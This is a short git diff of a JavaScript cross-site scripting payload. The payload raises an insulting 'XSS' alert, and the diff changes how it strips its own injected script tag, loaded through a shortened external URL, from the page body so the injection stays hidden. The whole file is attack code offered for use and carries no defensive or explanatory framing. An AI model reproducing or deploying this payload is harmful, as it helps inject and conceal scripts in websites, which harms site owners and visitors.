@@ -2,18 +2,10 @@ alert("XSS BITCH!");
 
 var script = document.currentScript;
 
-var oldHtml = document.firstElementChild.innerHTML;
+var oldHtml = document.body.innerHTML;
 
-var newHtml = oldHtml.slice(0, oldHtml.search(script.innerHTML)+1);//the first argument of slice is the start position (index 0), but the second is how MANY characters
+var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/GFfRmX\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters
 
-newHtml = newHtml + oldHtml.slice( 
-  oldHtml.search(script.innerHTML) + script.innerHTML.length, 
-  oldHtml.search(script.innerHTML) + newHtml.length - "</script>".length
-);
+document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/GFfRmX\">".length )
 
-newHtml = newHtml + oldHtml.slice( 
-  newHtml.length - 1, 
-  oldHtml.length
-);
-
-document.innerHTML = newHtml;
+document.body.innerHTML = newHtml;
